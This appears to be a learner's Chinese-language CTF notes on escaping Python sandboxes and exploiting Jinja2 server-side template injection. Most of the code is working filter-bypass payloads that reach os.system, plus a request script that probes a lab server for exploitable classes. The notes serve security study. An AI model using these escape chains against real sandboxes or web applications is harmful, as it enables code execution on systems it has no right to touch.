># In C.method, with 1
>```
>
>`o.method(1)` 可以看作是 `C.method(o, 1)`的简写。

能引入 site 的话，就相当于有 os。

那么也就是说，能引入 site 的话，就相当于有 os。那如果 site 也被禁用了呢？没事，本来也就没打算直接 `import site`。可以利用 `reload`，变相加载 `os`：

```
>>> import site
>>> site.os
<module 'os' from 'C:\\Users\\Lenovo\\AppData\\Local\\Programs\\Python\\Python39\\lib\\os.py'>
>>> del site.os
>>> site.os
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
AttributeError: module 'site' has no attribute 'os'
>>> __import__('importlib').reload(site)
<module 'site' from 'C:\\Users\\Lenovo\\AppData\\Local\\Programs\\Python\\Python39\\lib\\site.py'>
>>> site.os
<module 'os' from 'C:\\Users\\Lenovo\\AppData\\Local\\Programs\\Python\\Python39\\lib\\os.py'>
>>>
```

所有的类都继承的`object`，那么我们先用`__subclasses__`看看它的子类，在子类中选择出可以利用的类。

学习通过列表推导式执行

```
[i.load_module('os').system('whoami') for i in ''.__class__.__mro__[-1].__subclasses__() if i.__name__ == 'BuiltinImporter']
```

利用`builtin_function_or_method` 的 `__call__`，首先需要找到`builtin_function_or_method`类型的函数，也就是内建函数

```
''.__class__.__base__.__subclasses__()[80].__init__.__globals__['__builtins__']['len'].__class__.__call__(eval, '1+1')

>>> "".__class__.__mro__[-1].__subclasses__()[22]().strip.__class__.__call__(eval, '__import__("os").system("whoami")')
desktop-13qds1a\lenovo
0

简单一点的paylaod
>>> ''.strip.__class__
<class 'builtin_function_or_method'>
>>> ''.strip.__class__.__call__(eval, '1+2')
3
```

### 文件读写

2.x 有个内建的 `file`：

```
>>> file('key').read()
'Macr0phag3\n'
>>> file('key', 'w').write('Macr0phag3')
>>> file('key').read()
'Macr0phag3'

DELPHI
```



还有个 `open`，2.x 与 3.x 通用。

还有一些库，例如：`types.FileType`(rw)、`platform.popen`(rw)、`linecache.getlines`(r)。

如果能写，可以将类似的文件保存为`math.py`，然后 import 进来：
math.py：

```
print(__import__('os').system('whoami'))
```

调用`import math`

这里需要注意的是，这里 py 文件命名是有技巧的。之所以要挑一个常用的标准库是因为过滤库名可能采用的是白名单。并且之前说过有些库是在`sys.modules`中有的，这些库无法这样利用，会直接从`sys.modules`中加入，比如`re`：

```
>>> 're' in __import__('sys').modules
True
>>> 'math' in __import__('sys').modules
False
```

这里的文件命名需要注意的地方：由于待测试的库中有个叫 `test`的，如果把测试的文件也命名为 test，会导致那个文件运行 2 次，因为自己 import 了自己。

math.py

```
import math

...
```

获取敏感信息：

1. `dir()`
2. `__import__("__main__").x`，其中 `__main__` 还会泄露脚本的绝对路径：`<module '__main__' from 'xxx.py'>`
3. `__file__`，文件绝对路径
4. `x.__dict__`
5. `locals()`
6. `globals()`
7. `vars()`
8. `sys._getframe(0).f_code.co_varnames`
9. `sys._getframe(0).f_locals`
10. `inspect.x`，inspect 有很多方法可以获取信息，比如获取源码可以用 `inspect.getsource`，还有其他很多的功能
11. 

### 绕waf

>`__getitem__` 是 Python 中的特殊方法之一，用于支持对象的索引操作。当一个对象定义了 `__getitem__` 方法时，它就可以像序列（如列表、元组等）一样进行索引和切片操作。
>
>在 Python 中，我们通常使用方括号 `[]` 来对序列类型的对象进行索引操作。例如，对于列表 `my_list`，我们可以使用 `my_list[index]` 来获取列表中指定索引位置的元素。当 `my_list` 定义了 `__getitem__` 方法时，这个索引操作就会调用对象的 `__getitem__` 方法，来实现对元素的获取。

>`__new__` 是 Python 中的一个特殊方法，用于创建类的实例（对象）。它是一个静态方法，负责在对象创建之前分配内存空间，并返回一个新的实例。
>
>在 Python 中，对象的创建通常是通过调用类的构造函数 `__init__` 实现的。`__init__` 方法用于对实例进行初始化操作，而 `__new__` 方法则用于实际的对象创建。
>
>当我们创建一个类的实例时，Python 解释器会首先调用 `__new__` 方法来创建一个新的实例对象，并将该实例对象作为第一个参数传递给 `__init__` 方法。然后，`__init__` 方法在这个实例对象上执行初始化操作。

###### 过滤[]

应对的方式就是将`[]`的功能用`pop`、`__getitem__` 代替（实际上`a[0]`就是在内部调用了`a.__getitem__(0)`）：

```
>>> "".__class__.__mro__[-1].__subclasses__()[7].__new__.__class__.__call__(eval, "1+1")
2
>>> "".__class__.__mro__.__getitem__(-1).__subclasses__().pop(7).__new__.__class__.__call__(eval, "1+1")
2
```

dict 也是可以 pop 的：`{"a": 123}.pop("a")`，也可以`dict.get(key, default)`

```
>>> {'a': 123}.pop('a')
123
>>> {'a': 123}.get('a')
123
>>> {'a': 123}.get('b', 456)
456
```

当然也可以用 `next(iter())` 替代，或许可以加上 `max` 之类的玩意。

```
>>> max(['1','2','3','4','5','6','7','8','a','b','0', 'csdzxc', '-1'])
'csdzxc'
>>> next(iter(['1','2','3','4','5','6','7','8','a','b','0', 'csdzxc', '-1']))
'1'
>>> min(['1','2','3','4','5','6','7','8','a','b','0', 'csdzxc', '-1'])
'-1'
```

###### **过滤引号**

**`chr()`：将一个Unicode编码对应的整数值转换为对应的字符，直接用chr把字符串拼出来**

```
>>> __import__('os').system(chr(119)+chr(104)+chr(111)+chr(97)+chr(109)+chr(105))
desktop-13qds1a\lenovo
0
```

**扣字符：挨个把字符拼接出来，利用 `str` 和 `[]`**

```
>>> __import__('os').system(str(().__class__.__new__)[21]+str(().__class__.__new__)[13]+str(().__class__.__new__)[14]+str(().__class__.__new__)[40]+str(().__class__.__new__)[10]+str(().__class__.__new__)[3])
desktop-13qds1a\lenovo
0
>>> str(().__class__.__new__)[21]+str(().__class__.__new__)[13]+str(().__class__.__new__)[14]+str(().__class__.__new__)[40]+str(().__class__.__new__)[10]+str(().__class__.__new__)[3]
'whoami'
```

`[]` 如果被过滤了也可以bypass，`str`被过滤了就用class给他构造出来，`''.__class__()`、`type('')()`、`format()` 即可，同理，`int`、`list` 有的也都是适用，可以通过`.__class__()`、`type('')()`构造出来，也可以先查看基类，再从基类子类找到`str`或者`int`类。

```
>>> ''.__class__.__base__.__subclasses__()[4]
<class 'int'>
```

```
>>> format(1,'d')
'1'
>>> format(11,'x')
'b'
>>> format(10,'x')
'a'
>>> chr(100).__class__(chr(100).__class__.__new__)
'<built-in method __new__ of type object at 0x00007FF803385140>'
>>> chr(100).__class__(chr(100).__class__.__new__).__getitem__(14)
'o'
```

也可以使用列表的 `join()` 方法来连接列表中的元素成为一个字符串

**格式化字符串：那过滤了引号，格式化字符串还能用吗？**

`(chr(37)+str({}.__class__)[1])%100 == 'd'`

`('%c') % 100` 是一个字符串格式化操作，它将整数 `100` 格式化为一个字符，并返回相应的字符。，`'%c'` 是一种格式指令，用于格式化一个整数为对应的字符。整数 `100` 对应的字符是 ASCII 表中的字符 'd'。

```
>>> chr(37)
'%'
>>> chr(37)+str({}.__class__)[1]
'%c'
>>> (chr(37)+str({}.__class__)[1])%100
'd'
```

**dict拿键**

`'whoami' == list(dict(whoami=1))[0] == str(dict(whoami=1))[2:8]`

```
>>> dict(whoami=1).keys()
dict_keys(['whoami'])
>>> ''.__class__(dict(whoami=1).keys())
"dict_keys(['whoami'])"
>>> repr(dict(whoami=1).keys())
"dict_keys(['whoami'])"
>>> list(dict(whoami=1).keys()).pop()
'whoami'
```

###### 过滤数字

>`any()` 是 Python 的一个内置函数，用于判断给定的可迭代对象中是否有至少一个元素为 True 或等价于 True 的元素。如果可迭代对象中至少有一个元素为 True，则 `any()` 返回 True；如果可迭代对象中所有元素都为 False，则 `any()` 返回 False。
>
>`all()` 是 Python 的一个内置函数，用于检查可迭代对象中的所有元素是否都为 True 或等价于 True。如果可迭代对象中的所有元素都为 True 或等价于 True，则 `all()` 返回 True；如果可迭代对象中存在任何一个元素为 False 或等价于 False，则 `all()` 返回 False。

1. 0：`int(bool([]))`、`Flase`、`len([])`、`any(())`
2. 1：`int(bool([""]))`、`True`、`all(())`、`int(list(list(dict(a၁=())).pop()).pop())`
3. 获取稍微大的数字：`len(str({}.keys))`，不过需要慢慢找长度符合的字符串
4. 1.0：`float(True)`
5. -1：`~0`

```
>>> ''.__class__.__base__.__subclasses__()[4]
<class 'int'>
>>> ''.__class__.__base__.__subclasses__()[4]('1')
1
>>> ''.__class__.__base__.__subclasses__()[4](bool())
0
>>> ''.__class__.__base__.__subclasses__()[4](bool(['']))
1
```

其实有了 `0` 就可以了，要啥整数直接做运算即可：

```
0 ** 0 == 1
1 + 1 == 2
2 + 1 == 3
2 ** 2 == 4
...

```

任意浮点数稍微麻烦点，需要想办法运算，但是一定可以搞出来，除非是 π 这种玩意.

```
>>> ''.__class__.__base__.__subclasses__()[26](''.__class__.__base__.__subclasses__()[22](''.__class__.__base__.__subclasses__()[4](bool()))+'.'+''.__class__.__base__.__subclasses__()[22](''.__class__.__base__.__subclasses__()[4](bool(['']))))
```

###### 限制空格

空格通常来说可以通过 `()`、`[]` 替换掉。例如：

`[i for i in range(10) if i == 5]` 可以替换为 `[[i][0]for(i)in(range(10))if(i)==5]`

```
>>> [i for i in range(5)]
[0, 1, 2, 3, 4]
>>> [(i)for(i)in(range(5))]
[0, 1, 2, 3, 4]
```

###### 过滤点号

```
getattr(object, name[, default])
```

- `object`：要获取属性的对象。
- `name`：属性的名称。
- `default`：可选参数，指定当属性不存在时返回的默认值。

```
>>> getattr(getattr(getattr(getattr(getattr('', '__class__'), '__base__'), '__subclasses__')()[139], '__init__'), '__globals__')['system']('whoami')
desktop-13qds1a\lenovo
0
```

###### 过滤下划线

`dir([object])` 是 Python 的一个内置函数，用于获取对象的所有属性和方法的列表。它返回一个包含对象所有属性、方法名称的列表。`object`可选参数，表示要查找属性和方法的对象。如果不提供 `object` 参数，则 `dir()` 返回当前作用域中的所有名称。

```
>>> dir(0)
['__abs__', '__add__', '__and__', '__bool__', '__ceil__', '__class__', '__delattr__', '__dir__', '__divmod__', '__doc__', '__eq__', '__float__', '__floor__', '__floordiv__', '__format__', '__ge__', '__getattribute__', '__getnewargs__', '__gt__', '__hash__', '__index__', '__init__', '__init_subclass__', '__int__', '__invert__', '__le__', '__lshift__', '__lt__', '__mod__', '__mul__', '__ne__', '__neg__', '__new__', '__or__', '__pos__', '__pow__', '__radd__', '__rand__', '__rdivmod__', '__reduce__', '__reduce_ex__', '__repr__', '__rfloordiv__', '__rlshift__', '__rmod__', '__rmul__', '__ror__', '__round__', '__rpow__', '__rrshift__', '__rshift__', '__rsub__', '__rtruediv__', '__rxor__', '__setattr__', '__sizeof__', '__str__', '__sub__', '__subclasshook__', '__truediv__', '__trunc__', '__xor__', 'as_integer_ratio', 'bit_length', 'conjugate', 'denominator', 'from_bytes', 'imag', 'numerator', 'real', 'to_bytes']
>>> dir(0)[0]
'__abs__'
>>> dir(0)[0][0]
'_'
>>> dir(0)[0][0]*2
'__'
```

###### 过滤运算符

`> < ! - +` 这几个比较简单就不说了。

1. 逻辑运算符：
   - `and`：逻辑与
   - `or`：逻辑或
   - `not`：逻辑非
2. 成员运算符：
   - `in`：检查元素是否在一个容器中
   - `not in`：检查元素是否不在一个容器中
3. 身份运算符：
   - `is`：检查两个对象是否是同一个对象（比较对象的内存地址）
   - `is not`：检查两个对象是否不是同一个对象
4. 位运算符：
   - `&`：按位与
   - `|`：按位或
   - `^`：按位异或
   - `~`：按位取反
   - `<<`：左移
   - `>>`：右移
5. 三元条件运算符：
   - `x if condition else y`：根据条件选择 `x` 或 `y`

`==` 可以用 `in` 来替换。

替换 `or` 的测试代码

```python
for i in [(100, 100, 1, 1), (100, 2, 1, 2), (100, 100, 1, 2), (100, 2, 1, 1)]:
    ans = i[0]==i[1] or i[2]==i[3]
    print(bool(eval(f'{i[0]==i[1]} | {i[2]==i[3]}')) == ans)
    print(bool(eval(f'- {i[0]==i[1]} - {i[2]==i[3]}')) == ans)
    print(bool(eval(f'{i[0]==i[1]} + {i[2]==i[3]}')) == ans)
```


上面这几个表达式都可以替换掉 `or`

替换 `and` 的测试代码

```python
for i in [(100, 100, 1, 1), (100, 2, 1, 2), (100, 100, 1, 2), (100, 2, 1, 1)]:
    ans = i[0]==i[1] and i[2]==i[3]
    print(bool(eval(f'{i[0]==i[1]} & {i[2]==i[3]}')) == ans)
    print(bool(eval(f'{i[0]==i[1]} * {i[2]==i[3]}')) == ans)
```

上面这几个表达式都可以替换掉 `and`

>字符串拼接
>
>- `+` 操作符：使用 `+` 操作符可以将两个字符串拼接在一起。
>
>```python
>pythonCopy codestr1 = "Hello, "
>str2 = "World!"
>result = str1 + str2
>print(result)  # 输出：Hello, World!
>```
>
>- `str.join()` 方法：该方法用于将一个字符串列表按照指定的分隔符连接成一个字符串。
>
>```python
>pythonCopy codewords = ["Hello", "World", "Python"]
>result = " ".join(words)
>print(result)  # 输出：Hello World Python
>```
>
>- `str.format()` 方法：通过使用花括号 `{}` 占位符，可以将变量或表达式的值插入到字符串中。
>
>```python
>pythonCopy codename = "Alice"
>age = 30
>result = "My name is {} and I am {} years old.".format(name, age)
>print(result)  # 输出：My name is Alice and I am 30 years old.
>```
>
>- f-strings（格式化字符串字面值）：在 Python 3.6 及以上版本中，可以使用 f-strings 来进行字符串插值。
>
>```python
>pythonCopy codename = "Alice"
>age = 30
>result = f"My name is {name} and I am {age} years old."
>print(result)  # 输出：My name is Alice and I am 30 years old.
>```
>
>- `%`操作符：使用 `%` 操作符将变量插入到字符串中，使用 `%` 操作符时，字符串中使用 `%s` 作为占位符，它表示将字符串格式化为字符串形式，`%d` 表示格式化为整数形式，`%f` 表示格式化为浮点数形式，等等。然后，使用 `%` 操作符将这些变量插入到字符串中。
>
>```python
>name = "Alice"
>age = 30
>
># 使用 % 进行字符串拼接
>result = "My name is %s and I am %d years old." % (name, age)
>print(result)  # 输出：My name is Alice and I am 30 years old.
>```

######  限制 ( )

这种情况下通常需要能够支持 exec 执行代码。因为有两种姿势：

- 利用装饰器 `@` * [这里](#Python中@的用法)
- 利用魔术方法，例如 `enum.EnumMeta.__getitem__`，

**利用`@`**

在 Python 中，除了通过 `()` 执行函数、初始化类等之外，还有装饰器可以用于触发函数调用：

```python
 # 类修饰符可以在类定义之前使用，作用于整个类。当定义类时，修饰符函数会在类创建时被调用，且只调用一次。
def base1(a):
    print(f"base1 -> {a}")
    return a


def base2(cls):
    print(f"base2 -> {cls}")
    return "hello"

@base1
@base2
class MyClass:
    pass

"""
结果
base2 -> <class '__main__.MyClass'>
base1 -> hello
"""
```

`MyClass`先传到`base2`，`base2`return的结果作为`base1`的参数传入，如果不用括号创建函数，就要用到匿名函数`lambda`

```python
from os import system

a = lambda b: 'whoami'

@system
@a
class MyClass:
    pass

"""
结果：desktop-13qds1a\lenovo
"""
```

先调用`lambda`函数`a`，函数`a`再返回payload给`system`调用

**利用魔术方法**

```python
from os import system


class x:
    def __getitem__(self, x):
        system(x)


# 上面这个写法可以改写为：
class x: pass
x.__getitem__ = system


x()["whoami"]
"""
结果：desktop-13qds1a\lenovo
"""
```

但是因为不能用`()`实例化类，所以我们需要在标准库里寻找一个模块，这个模块必须包含某个类以及这个类的实例。符合这种条件的库一般是一种类型。比如 `enum`，`enum.Enum` 是 `enum.EnumMeta` 的一个子类：

![img](daydayup.assets/20220627110341.png)

```python
import enum
from os import system

enum.EnumMeta.__getitem__ = system
enum.Enum['whoami']
```

类似的库还有：`reprlib`:

![img](daydayup.assets/20220627105947.png)

```python
import reprlib
from os import system

reprlib.Repr.__getitem__ = system
reprlib.aRepr['chcp 65001']
reprlib.aRepr['dir']
```



>`__new__`方法是 Python 中的一个特殊方法，用于创建对象。它是类的内置静态方法，负责在内存中为一个新对象分配空间，并返回该对象的引用。
>
>在 Python 中，对象的创建通常是通过调用类的构造函数 `__init__` 实现的。`__init__` 方法用于对实例进行初始化操作，而 `__new__` 方法则用于实际的对象创建。
>
>当我们创建一个类的实例时，Python 解释器会首先调用 `__new__` 方法来创建一个新的实例对象，并将该实例对象作为第一个参数传递给 `__init__` 方法。然后，`__init__` 方法在这个实例对象上执行初始化操作。
>
>```python
>class MyClass:
>    def __new__(cls, *args, **kwargs):
>        # 创建一个新的对象实例
>        instance = super().__new__(cls)
>        print("Creating a new instance.")
>        return instance
>
>    def __init__(self, x):
>        self.x = x
>        print("Initializing the instance.")
>
>obj = MyClass(42)
>"""
>在 __new__ 方法中，使用 super().__new__(cls) 创建了一个新的对象实例，并返回该实例。然后，__init__ 方法被调用，用于初始化对象的属性。
>"""
>```

>#### 元类
>
>元类（metaclass）是一种高级的概念，用于控制类的创建过程。元类允许你在定义类时定制类的创建行为，类似于类是用于创建对象的模板，而元类是用于创建类的模板。
>
>Python 中的每个类都有一个元类，如果没有显式地指定元类，Python 会使用默认的元类 `type` 来创建类。默认情况下，所有的类都是直接或间接地继承自 `object` 类，而 `object` 类是由 `type` 元类创建的。
>
>使用元类可以实现一些高级的功能，例如：
>
>1. 自定义类的创建行为：你可以定义自己的元类来控制类的创建过程，例如修改类的属性、方法，添加额外的功能等。
>
>   ```python
>   class MyMeta(type):
>       def __new__(cls, name, bases, dct):
>           # 在类创建之前，修改类的属性
>           dct['x'] = 42
>           return super().__new__(cls, name, bases, dct)
>   
>   class MyClass(metaclass=MyMeta):
>       pass
>   
>   print(MyClass.x)  # 输出：42
>   ```
>
>   
>
>2. 限制类的定义：通过定义元类，你可以在类定义时执行特定的检查或操作，从而限制类的定义。
>
>   ```python
>   class RestrictedMeta(type):
>       def __new__(cls, name, bases, dct):
>           print("RestrictedMeta -> new")
>           # 在创建类对象之前执行一些操作，例如修改类属性
>           if name == 'RestrictedClass':
>               dct['secret'] = 42
>           print(f"super(cls, cls).__new__(cls, name, bases, dct) -> {super(cls, cls).__new__(cls, name, bases, dct)}")
>           print(f"cls.__mro__ -> {cls.__mro__}")
>           return super(cls, cls).__new__(cls, name, bases, dct)
>   
>       def __init__(cls, name, bases, dct):
>           super().__init__(name, bases, dct)
>           print("RestrictedMeta -> init")
>           if 'secret' not in dct:
>               raise ValueError("Class must have a 'secret' attribute.")
>   
>   
>   class RestrictedClass(metaclass=RestrictedMeta):
>       def __new__(cls, *args, **kwargs):
>           # 创建一个新的对象实例
>           instance = super().__new__(cls)
>           print("RestrictedClass -> new")
>           return instance
>   
>   
>   print("实例化 -> RestrictedClass")
>   RestrictedClass()
>   
>   # class Restricted2Class(metaclass=RestrictedMeta):
>   #     secret = 43
>   
>   # # 下面的代码会抛出 ValueError，因为没有定义 'secret' 属性
>   # try:
>   #     class AnotherClass(metaclass=RestrictedMeta):
>   #         pass
>   # except ValueError:
>   #     print("AnotherClass -> " + str(ValueError))
>   
>   ```
>
>   
>
>3. 创建单例模式：使用元类，你可以确保类只有一个实例。
>
>   ```python
>   class SingletonMeta(type):
>       _instances = {}
>   
>       def __call__(cls, *args, **kwargs):
>           if cls not in cls._instances:
>               cls._instances[cls] = super().__call__(*args, **kwargs)
>           return cls._instances[cls]
>   
>   class SingletonClass(metaclass=SingletonMeta):
>       def __init__(self, value):
>           self.value = value
>   
>   obj1 = SingletonClass(42)
>   obj2 = SingletonClass(99)
>   
>   print(obj1 is obj2)  # 输出：True，因为 obj1 和 obj2 引用的是同一个实例
>   print(obj1.value)    # 输出：42
>   print(obj2.value)    # 输出：42
>   ```
>
>   
>
>以下是元类中一些常用的魔法方法及其作用：
>
>1. `__new__(cls, name, bases, dct)`：
>   - 该方法在**创建类**时被调用，并返回**类对象**的实例。
>   - 参数 `cls` 是元类本身。
>   - 参数 `name` 是要创建的类的名称。
>   - 参数 `bases` 是类的基类，即父类。
>   - 参数 `dct` 是类的属性字典，包含了在类定义中定义的所有类属性和方法。
>   - 通过重写 `__new__` 方法，你可以自定义类的创建过程，包括修改类的属性、方法等。
>2. `__init__(cls, name, bases, dct)`：
>   - 该方法在**创建类**时被调用，用于初始化**类对象**。
>   - 参数 `cls` 是元类本身。
>   - 参数 `name` 是要创建的类的名称。
>   - 参数 `bases` 是类的基类，即父类。
>   - 参数 `dct` 是类的属性字典，包含了在类定义中定义的所有类属性和方法。
>   - 在 `__init__` 方法中，通常不需要返回任何值，它用于执行额外的类初始化操作。
>3. `__call__(cls, *args, **kwargs)`：
>   - 该方法在**创建类**的实例时被调用。
>   - 参数 `cls` 是元类本身。
>   - 参数 `*args` 和 `**kwargs` 是创建实例时传递的参数。
>   - 通过重写 `__call__` 方法，你可以自定义实例的创建过程，例如实现单例模式或控制实例的初始化。
>4. `__prepare__(name, bases, **kwargs)`：
>   - 该方法在创建类时被调用，用于准备类的属性字典。
>   - 参数 `name` 是要创建的类的名称。
>   - 参数 `bases` 是类的基类，即父类。
>   - 参数 `**kwargs` 可以接收额外的关键字参数。
>   - 通过重写 `__prepare__` 方法，你可以自定义类的属性字典，用于存储类的成员。
>5. `__setattr__(cls, name, value)`：
>   - 该方法在给类设置属性时被调用。
>   - 参数 `cls` 是元类本身。
>   - 参数 `name` 是属性名。
>   - 参数 `value` 是属性的值。
>   - 通过重写 `__setattr__` 方法，你可以在类创建时对属性进行特定的限制或操作。
>6. `__getattribute__(cls, name)`：
>   - 该方法在获取类的属性时被调用。
>   - 参数 `cls` 是元类本身。
>   - 参数 `name` 是属性名。
>   - 通过重写 `__getattribute__` 方法，你可以在获取属性时执行额外的操作，例如记录日志或进行特定的处理。
>7. `__instancecheck__(cls, instance)`：
>   - 该方法在使用 `isinstance()` 检查类的实例时被调用。
>   - 参数 `cls` 是元类本身。
>   - 参数 `instance` 是要检查的实例对象。
>   - 通过重写 `__instancecheck__` 方法，你可以自定义类的实例检查行为。
>8. `__subclasscheck__(cls, subclass)`：
>   - 该方法在使用 `issubclass()` 检查类的子类时被调用。
>   - 参数 `cls` 是元类本身。
>   - 参数 `subclass` 是要检查的子类。
>   - 通过重写 `__subclasscheck__` 方法，你可以自定义类的子类检查行为。
>
>元类中`__new__`和`__init__`的调用是在创建类也就是类定义时调用，而不是实例化类，返回的也是类对象，而不是类的实例
>
>![image-20230801175631481](daydayup.assets/image-20230801175631481.png)
>
>![image-20230801175717484](daydayup.assets/image-20230801175717484.png)

###### 利用f-string

```
>>> f'{__import__("os").system("whoami")}'
macr0phag3
'0'
```



## SSTI

[X3NNY/sstilabs: A lab to help you learning SSTI (github.com)](https://github.com/X3NNY/sstilabs)

### SSTI简介

SSTI就是服务器模板注入 当前使用的一些框架，比如python的flask，php的tp，java的spring等一般都采用成熟的MVC的模式，用户 的输入先进入Controller控制器，然后根据请求类型和请求的指令发送给对应Model业务模型进行业务逻辑 判断，数据库存取，最后把结果返回给View视图层，经过模板渲染展示给用户。

漏洞成因就是服务端接收了用户的恶意输入以后，未经任何处理就将其作为 Web 应用模板内容的一部分， 模板引擎在进行目标编译渲染的过程中，执行了用户插入的可以破坏模板的语句，因而可能导致了敏感信息 泄露、代码执行、GetShell 等问题。其影响范围主要取决于模版引擎的复杂性。

凡是使用模板的地方都可能会出现 SSTI 的问题，SSTI 不属于任何一种语言，沙盒绕过也不是，沙盒绕过只 是由于模板引擎发现了很大的安全漏洞，然后模板引擎设计出来的一种防护机制，不允许使用没有定义或者 声明的模块，这适用于所有的模板引擎。

### 模板是什么

模板引擎（特指web开发的模板引擎）是为了使用户界面与业务数据（内容）分离而产生的，他可以生成特 定格式的文档，用于网站的模板引擎就会生成一个标准的HTML文档。 模板引擎会提供一套生成 HTML 代码的程序，然后只需要获取用户的数据，然后放到渲染函数里，然后生成 模板+用户数据的前端 HTML 页面，然后反馈给浏览器，呈现在用户面前。 它可以理解为一段固定好格式，等着你来填充信息的文件。通过这种方法，可以做到逻辑与视图分离，更容 易、清楚且相对安全地编写前后端不同的逻辑。

### 漏洞成因

ssti主要为python的一些框架 jinja2 mako tornado django，PHP框架smarty twig，java框架jade velocity 等等使用了渲染函数时，由于代码不规范或信任了用户输入而导致了服务端模板注入，模板渲染其实并没有 漏洞，主要是程序员对代码不规范不严谨造成了模板注入漏洞，造成模板可控。

### SSTI基础知识

##### Python-flask模板

Python-Flask使用Jinja2作为渲染引擎 （Jinja2.10.x Documention）

 jinja2是Flask作者开发的一个模板系统，起初是仿django模板的一个模板引擎，为Flask提供模板支持，由 于其灵活，快速和安全等优点被广泛使用。

在jinja2中，存在三种语法：

```
控制结构 {% %}，也可以用来声明变量（{% set c = "1" %}）
变量取值 {{ }}，比如输入 1+1，2*2，或者是字符串、调用对象的方法，都会渲染出执行的结果
{# ... #} 表示未包含在模板输出中的注释
在模板注入中，主要使用的是{{}} 和 {%%}
检测是否存在ssti
在url后面，或是参数中添加 {{ 6*6 }} ，查看返回的页面中是否有 36
```

jinja2模板中使用 {{ }} 语法表示一个变量，它是一种特殊的占位符。当利用jinja2进行渲染的时候，它会把这些特殊的占位符进行填充/替换，jinja2支持python中所有的Python数据类型比如列表、字段、对象等，被两个括号包裹的内容会输出其表达式的值。

###### 过滤器

jinja2中的过滤器可以理解为是jinja2里面的内置函数和字符串处理函数，用于修饰变量，甚至支持参数 `range(10)|join(', ')`；以及链式调用，只需要在变量后面使用管道符 `|` 分割，前一个过滤器的输出会作为后一个过滤器的输入，例如，`{{ name|striptags|title }}` 会移除 HTML Tags，并且进行 title-case 转化，这个过滤器翻译为 Python 的语法就是 `title(striptags(name))`。

###### 宏

jinja2中还有宏，宏允许你定义一组代码，并在模板中多次调用它，类似于函数。

使用 `macro` 关键字，并指定宏的名称和参数列表。然后，在模板中使用 `call` 关键字来调用宏，并传递相应的参数。

```jinja2
{% macro greet(name) %}
    Hello, {{ name }}!
{% endmacro %}

{{ greet("A") }}
{{ greet("B") }}
```

还能够设置默认参数

```jinja2
{% macro greet(name, greeting="Hello") %}
    {{ greeting }}, {{ name }}!
{% endmacro %}

{{ greet("A") }}
{{ greet("B", greeting="Hi") }}
```

宏还能够支持导入

```jinja2
{% import 'form.html' as form %}}
{{ form.greet("B", greeting="Hi") }}
```

还有一种调用方法，`call`，`macro` 有一个隐含参数 `caller`，其作用是返回 `call` 块中间的内容

```jinja2
{% macro foo(name) -%}
    <div>{{ name ~ " says: " ~ caller() }}</div>
{%- endmacro %}

{% call foo("wi1shu") %}
    你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好你好
{% endcall %}
```

>值得注意的是，如果不想传递 `caller` 中的内容，也需要在 `macro` 中调用 `caller()`，否则会报错：
>
>TypeError: macro ‘foo’ was invoked with two values for the special caller argument. This is most likely a bug.

###### 模板继承

模板继承允许我们创建一个骨架文件，其他文件从该骨架文件继承。并且还支持针对自己需要的地方进行修改。

jinja2 的骨架文件中，利用 `block` 关键字表示其包涵的内容可以进行修改。

base.html

```html
<head>
    {% block head %}<link
    <title>{% block title %}{% endblock %} - World</title>
    {% endblock %}
</head>

<body>
    <div id="content">{% block content %}{% endblock %}</div>
    <div id="footer">
        {% block  footer %}
        <script>This is javascript</script>
        {% endblock %}
    </div>
</body>
```

sub.html继承base.html的模板：

```html
{% extends "base.html" %}  <!-- 继承 -->

{% block title %} Hello {% endblock %}  <!-- title 自定义 -->

{% block head %}
    {{ super() }}  <!-- 用于获取原有的信息 -->
    <style type='text/css'>
    .important { color: #FFFFFF }
    </style>
{% endblock %}   
 
<!-- 其他不修改的原封不动的继承 -->
```

渲染：

```python
from jinja2 import FileSystemLoader, Environment

env = Environment(loader=FileSystemLoader("./"))
print(env.get_template("sub.html").render())
```

这里用到了 `FileSystemLoader`，其实用它的逻辑很简单。我们在 bbb.html 中写了 `{% extends "base.html" %}`，那 jinja2 怎么知道 base.html 在哪呢？`FileSystemLoader` 就是用来指定模板文件位置的。同样用途的还有 `PackageLoader`，它是用来指定搜索哪个 Python 包下的模板文件

##### Python中的一些 Magic Method

在Python中，所有以“”双下划线包起来的方法，都统称为“Magic Method”，中文称『魔术方法』,例如类的 初始化方法`__init__`

一些做SSTI类题目时常用的属性和方法

```
属性
__class__：用于获取当前对象所对应的类
__base__：用于获取该类的直接父类（基类）
__bases__：返回一个类直接所继承的类（元组形式）
__mro__：返回一个类所继承的所有类
__dict__：返回当前类的函数、全局变量、属性等
__init__：用于将对象实例化，所有类都具有 __init__ 方法，便于利用它来作为跳板访问 __globals__
__globals__：function.__globals 用于获取function所处空间下可使用的module、方法以及所有变量
__builtins__：获取python内置的方法比如ord、chr等
方法
__subclasses__：返回该类的所有直接子类
__import__：动态加载类和函数，也就是导入模块，经常用于导入os模块
__getattribute__：在访问对象的属性时进行自定义处理。无论对象中的属性是否存在，只要访问对象的属性，就会无条件进入
__getattr__：访问对象中不存在的属性时进行处理。当对象中没有被访问的属性时，Python解释器会自动调用该方法
```

#### 常用注入模块

爆破需要的模块的EXP：

```Python
import requests
from lxml import html

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36',
}

url = "http://192.168.159.128:50000/level/1"

NUM = 500

if __name__ == "__main__":

    # # 查找类
    # find_class = "importlib"
    # for i in range(NUM):
    #
    #     data_class1 = {
    #         'code': "{{().__class__.__bases__[0].__subclasses__()[%d]}}" % i
    #     }
    #
    #     res = requests.post(url=url, data=data_class1, headers=headers)
    #     if find_class in res.text:
    #         tree = html.fromstring(res.text)
    #         print(str(i) + " -> " + tree.text)

    # 查找类方法
    find_method = "load_module"
    for i in range(NUM):

        data_method = {
            'code': "{{().__class__.__bases__[0].__subclasses__()[%d].__init__.__globals__}}" % i
        }

        data_class = {
            'code': "{{().__class__.__bases__[0].__subclasses__()[%d]}}" % i
        }

        res = requests.post(url=url, data=data_method, headers=headers)
        if find_method in res.text:
            res2 = requests.post(url=url, data=data_class, headers=headers)
            tree = html.fromstring(res2.text)
            print(str(i) + " -> " + tree.text)

    # # 查看内置函数
    # for i in range(NUM):
    #     data_builtins = {
    #         'code': "{{().__class__.__bases__[0].__subclasses__()[%i].__init__.__globals__['__builtins__']}}" % i
    #     }
    #
    #     res3 = requests.post(url=url, data=data_builtins, headers=headers)
